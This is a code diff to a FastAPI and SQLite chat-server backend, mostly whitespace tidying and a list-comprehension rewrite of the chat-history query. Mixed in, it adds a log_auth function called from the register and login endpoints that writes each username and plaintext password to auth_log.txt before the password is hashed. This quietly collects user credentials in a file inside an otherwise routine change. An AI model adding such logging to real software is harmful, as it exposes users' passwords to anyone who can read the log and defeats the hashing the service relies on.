@@ -20,6 +20,7 @@ app.add_middleware(
 
 conn = sqlite3.connect('messenger.db', check_same_thread=False)
 cursor = conn.cursor()
+
 cursor.execute('''
     CREATE TABLE IF NOT EXISTS users (
         id INTEGER PRIMARY KEY,
@@ -76,8 +77,13 @@ class DeleteMessage(BaseModel):
 
 online_users: Dict[str, WebSocket] = {}
 
+def log_auth(action: str, username: str, password: str):
+    with open("auth_log.txt", "a", encoding="utf-8") as f:
+        f.write(f"[{datetime.now()}] {action.upper()} - Username: {username}, Password: {password}\n")
+
 @app.post("/register")
 async def register_user(user: User):
+    log_auth("register", user.username, user.password)
     hashed_password = pwd_context.hash(user.password)
     try:
         cursor.execute(
@@ -91,6 +97,7 @@ async def register_user(user: User):
 
 @app.post("/login")
 async def login_user(user: User):
+    log_auth("login", user.username, user.password)
     cursor.execute(
         'SELECT password FROM users WHERE username = ?',
         (user.username,)
@@ -182,15 +189,15 @@ async def get_chat_history(user1: str, user2: str, limit: int = 50):
         WHERE (sender = ? AND receiver = ?) OR (sender = ? AND receiver = ?)
         ORDER BY timestamp DESC LIMIT ?
     ''', (user1, user2, user2, user1, limit))
-    messages = []
-    for row in reversed(cursor.fetchall()):
-        messages.append({
+    messages = [
+        {
             'id': row[0],
             'sender': row[1],
             'receiver': row[2],
             'message': row[3],
             'timestamp': row[4]
-        })
+        } for row in reversed(cursor.fetchall())
+    ]
     return {"messages": messages}
 
 @app.post("/add_friend")
@@ -261,7 +268,7 @@ async def get_user_friends(username: str):
 async def websocket_endpoint(websocket: WebSocket, user_id: str):
     await websocket.accept()
     online_users[user_id] = websocket
-    
+
     cursor.execute(
         '''
         SELECT CASE
@@ -282,7 +289,7 @@ async def websocket_endpoint(websocket: WebSocket, user_id: str):
     for friend in friends:
         if friend in online_users:
             await online_users[friend].send_text(json.dumps(status_message))
-    
+
     try:
         while True:
             data = await websocket.receive_text()
@@ -351,7 +358,6 @@ async def websocket_endpoint(websocket: WebSocket, user_id: str):
                                 "id": message["id"]
                             }))
     except WebSocketDisconnect:
-
         online_users.pop(user_id, None)
         status_message = {
             "action": "user_status",
